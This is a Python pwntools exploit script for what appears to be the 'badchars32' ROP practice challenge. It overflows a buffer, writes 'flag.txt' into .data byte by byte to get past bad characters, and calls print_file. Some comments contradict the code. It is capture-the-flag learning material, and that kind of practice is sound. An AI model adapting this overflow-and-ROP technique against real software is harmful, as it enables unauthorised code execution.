
from pwn import *
from pprint import pprint
offset = 36 

context.arch = 'i386'

elf = ELF("./badchars32")
p = elf.process()
#gdb.attach(p, gdbscript='''
# script
#''')


p.recvuntil(b">")

# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

buf += b"\x01\x41\x41\x41"
# print("buf is: ", buf)
# buf += b"CAAA"


# print out rop gadget to make sure that it reads: "pop edi ; pop ebp ; ret"
# print("gadget to pop esi, edi, ebp 1 is at: ", p32(rop.esi.address))

# it does, so put it into a variable for our payload
pop_values_gadget =  p32(rop.esi.address)

# locate the start of the .data section header 
data_addr = p32(elf.symbols["data_start"])



# esi is the string we want, so = "flag.txt"
# we're gona write "fl", then one byte at a time, because "fl" are the only consecutive non-bad-chars
esi1 = b"fl\x00\x00"
esi2 = b"\x60\x00\x00\x00"
esi3 = b"\x66\x00\x00\x00"
esi4 = b"\x2d\x00\x00\x00"
esi5 = b"\x74\x00\x00\x00"
esi6 = b"\x77\x00\x00\x00"
esi7 = b"\x74\x00\x00\x00"


# first value we're popping is edi... since we want *edi = ebp = "flag", set edi to .data address
# this is because we're writing the string "flag" to memory starting at the .data section
edi1 = data_addr
# now we go to the data address, and go up 2 places, 
edi2 = p32(elf.symbols["data_start"] + 2)
edi3 = p32(elf.symbols["data_start"] + 3)
edi4 = p32(elf.symbols["data_start"] + 4)
edi5 = p32(elf.symbols["data_start"] + 5)
edi6 = p32(elf.symbols["data_start"] + 6)
edi7 = p32(elf.symbols["data_start"] + 7)


#print("edi1 is: " , edi1)
#print("edi2 is: " , edi2)
#print("edi3 is: " , edi3)
#print("edi4 is: " , edi4)
#print("edi5 is: " , edi5)
#print("edi6 is: " , edi6)
#print("edi7 is: " , edi7)


# ebps
fake_ebp1 = p32(elf.symbols["data_start"])
fake_ebp2 = edi2
fake_ebp3 = edi3
fake_ebp4 = edi4
fake_ebp5 = edi5
fake_ebp6 = edi6
fake_ebp7 = edi7

#print("ebp is: " , fake_ebp1)
#print("ebp2 is: " , fake_ebp2)
#print("ebp3 is: " , fake_ebp3)
#print("ebp4 is: " , fake_ebp4)
#print("ebp5 is: " , fake_ebp5)
#print("ebp6 is: " , fake_ebp6)
#print("ebp7 is: " , fake_ebp7)


# address of useful gadget that will set *edi = esi
store_string_in_data_gadget = p32(elf.symbols["usefulGadgets"] + 12) 

# address of our rop gadget that adds bl to *ebp
add_1_to_string_gadget = p32(elf.symbols["usefulGadgets"])


# get the address of the print_file function--this is our final function that we are leveraging in order to open the "flag.txt" file
print_file_addr = p32(elf.symbols["plt.print_file"])

# arguments for the print_file function are stored in .data section header
args = data_addr

payload = [
        buf,                            # bunch of A's, with EL value = 1
        b"bbbb",                        # fake ebp
        pop_values_gadget,              # addr of "pop edi; pop ebp; ret;"
        esi1,                           # "flag" 
        edi1,                           # addr of start of .data section header
        fake_ebp1,                      # addr of start of .data section header
        store_string_in_data_gadget,     # addr of useful gadget = mov [edi], ebp
        pop_values_gadget,
        esi2,
        edi2,
        fake_ebp2,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi3,
        edi3,
        fake_ebp3,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi4,
        edi4,
        fake_ebp4,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi5,
        edi5,
        fake_ebp5,
        store_string_in_data_gadget,
        pop_values_gadget,
        esi6,
        edi6,
        fake_ebp6,
        store_string_in_data_gadget,
        add_1_to_string_gadget,
        pop_values_gadget,
        esi7,
        edi7,
        fake_ebp7,
        store_string_in_data_gadget,
        print_file_addr,
        b"cccc",
        args


#        
        # Disregard this stuff below... It's from previous script

        #edi2,                   # addr of start of .data section header + 0x4
        #ebp2,                   # ".txt"
        #store_string_in_data_gadget,     # addr of useful gadget = mov [edi], ebp
        #print_file_addr,        # addr of print_file in usefulFunction
        #fake_eip,               # addr of fake eip = "dddd"
        #args                    # arguments for print_file fxn = address of .data section header

        ]

payload = b"".join(payload)
# print("payload is: ", payload)

p.send(payload)

p.interactive()
print(p.recvall())
p.close()

